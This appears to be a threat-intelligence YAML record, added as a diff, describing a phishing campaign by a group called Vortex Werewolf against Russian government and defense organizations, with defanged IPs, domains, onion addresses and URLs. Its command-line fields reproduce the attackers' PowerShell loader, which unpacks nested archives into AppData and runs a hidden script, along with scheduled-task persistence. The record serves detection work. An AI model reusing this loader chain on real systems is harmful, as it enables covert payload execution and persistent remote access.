@@ -1,0 +1,119 @@
+title: 'Approaching cyclone: Vortex Werewolf attacks Russia'
+description: Vortex Werewolf targeted Russian government and defense organizations
+  using phishing emails disguised as Telegram filesharing URLs, delivering malware
+  that installs Tor and OpenSSH for remote access.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes:
+  - photoshopexpress.exe
+  - finalcutpro.exe
+  - sshshellhost.exe
+  - powershell.exe
+  - conhost.exe
+  command_lines:
+  - powershell.exe $mainConfigCapacity = (where.exe /r $env:USERPROFILE 'Spisok na
+    peremeshchenie.zip') | select -First 1; $permanentDetailResult=$mainConfigCapacity.Trim();
+    Expand-Archive $permanentDetailResult -DestinationPath $env:APPDATA\projectDuration;
+    $permanentDetailResult=$env:APPDATA+'\projectDuration\System Volume Information\logLength';
+    $entryResult=$permanentDetailResult+'.zip'; Rename-Item -Path $permanentDetailResult
+    -NewName $entryResult; Expand-Archive -Path $entryResult -DestinationPath $env:APPDATA\reaper;
+    $activeModeArray = gc $env:APPDATA\reaper\totalQuerySignal; Start-Process -WindowStyle
+    Hidden powershell $activeModeArray
+  - conhost headless %AppData%/reaper/finalcutpro.exe -f transactionMapcurrentPlanMode.xml
+  - conhost headless %AppData%/reaper/photoshopexpress.exe -f firstPathLabel
+  powershell:
+  - $mainConfigCapacity = (where.exe /r $env:USERPROFILE 'Spisok na peremeshchenie.zip')
+    | select -First 1; $permanentDetailResult=$mainConfigCapacity.Trim(); Expand-Archive
+    $permanentDetailResult -DestinationPath $env:APPDATA\projectDuration; $permanentDetailResult=$env:APPDATA+'\projectDuration\System
+    Volume Information\logLength'; $entryResult=$permanentDetailResult+'.zip'; Rename-Item
+    -Path $permanentDetailResult -NewName $entryResult; Expand-Archive -Path $entryResult
+    -DestinationPath $env:APPDATA\reaper; $activeModeArray = gc $env:APPDATA\reaper\totalQuerySignal;
+    Start-Process -WindowStyle Hidden powershell $activeModeArray
+  scripts: []
+  registry_keys: []
+  image_loads:
+  - libcrypto.dll
+  network_connections:
+  - photoshopexpress.exe -> tg-media.guardedcloud[.]net:443
+  - finalcutpro.exe -> tg-media.guardedcloud[.]net:443
+  - sshshellhost.exe -> tg-media.guardedcloud[.]net:443
+  - powershell.exe -> tg-media.guardedcloud[.]net:443
+  file_activity:
+  - '%APPDATA%\reaper\totalQuerySignal'
+  - '%APPDATA%\projectDuration'
+  - '%APPDATA%\reaper\totalQuerySignal'
+  persistence:
+  - Windows Task Scheduler task named finalcutproRepairTask running conhost headless
+    %AppData%/reaper/finalcutpro.exe -f transactionMapcurrentPlanMode.xml
+  - Windows Task Scheduler task named photoshopexpressBackup running conhost headless
+    %AppData%/reaper/photoshopexpress.exe -f firstPathLabel
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+  - 103.17.154[.]137
+  - 129.153.78[.]39
+  - 156.67.24[.]236
+  - 156.67.24[.]239
+  - 158.174.146[.]87
+  - 176.169.236[.]210
+  - 185.177.207[.]101
+  - 185.177.207[.]103
+  - 185.177.207[.]132
+  - 185.177.207[.]18
+  - 185.177.207[.]216
+  - 185.177.207[.]62
+  - 185.177.207[.]63
+  - 188.116.26[.]254
+  - 188.245.88[.]107
+  - 190.62.5[.]156
+  - 193.138.81[.]106
+  - 198.98.53[.]149
+  - 24.134.5[.]121
+  - 38.242.242[.]79
+  - 45.76.185[.]188
+  - 45.76.46[.]212
+  - 5.22.221[.]14
+  - 70.34.216[.]248
+  - 77.128.112[.]133
+  - 78.159.118[.]224
+  - 82.117.243[.]191
+  - 85.117.251[.]69
+  - 86.206.9[.]78
+  - 87.106.143[.]190
+  - 87.106.159[.]211
+  - 89.116.48[.]119
+  domains:
+  - telegram-files.trustedfiles[.]org
+  - tg-media.guardedcloud[.]net
+  - telegram-share.documtransfer[.]net
+  - trustedfiles[.]org
+  - guardedcloud[.]net
+  - documtransfer[.]net
+  - biavid[.]info
+  - safedatabox[.]net
+  - documshare[.]org
+  - telegram.guardedcloud[.]net
+  - docs-telegram.guardedcloud[.]net
+  - sectgfiles.biavid[.]info
+  - teleinfo.safedatabox[.]net
+  - tg-box.documshare[.]org
+  - yankovskiy987.github[.]io
+  - gendalfgrey221.github[.]io
+  - nieusoaps11.github[.]io
+  - icchtolkaio.github[.]io
+  - 3lfdhuojbznd4fmunkkzr2m5zbnaibwuyvenclsoxvapylqv4pdldqad[.]onion
+  - amvlfdftchgyoie7femnnivsfnqzizrljm5rbixgsxpzgdavdtkhtlad[.]onion
+  - 2zrek3mkl72d5b6evpkx2rz2glzrltiorgblpfb2ttg6lacwlsdk4iqd[.]onion
+  - clgkhqmtssx4dgvhq5r4kb4anid4n375d2z5mqspuob3iyqvzyrxhoqd[.]onion
+  urls:
+  - hxxps://telegram-files.trustedfiles[.]org/?cuid=vG7LLN&cloud_access=E20340B73A&tuid=2bWqrF&hash=d3BdF6F9Bd&folder=520e66fe3F
+  - hxxps://telegram-files.trustedfiles[.]org/?nash=2BC8BD579d&cloud_access=06c434ED64&tuid=efGVBj&folder=8057d1704f&cuid=3e12KE
+  - hxxps://telegram-files.trustedfiles[.]org/?folder=009c027D11&tuid=1MM5Jx&cloud_access=f8CfeE6518&hash=a9D53e2Cd9&cuid=vG7LLN
+  - hxxps://tg-media.guardedcloud[.]net/?access_hash=ceFFc8F817&cuid=nghdRm&code=A824c7d9D3&tuid=SuCmHG
+authors: []
+reference: https://bi.zone/eng/expertise/blog/nadvigayushchiysya-tsiklon-vortex-werewolf-atakuet-rossiyu
+date_of_publication: December 01, 2025
+file_creation_date: May 14, 2026
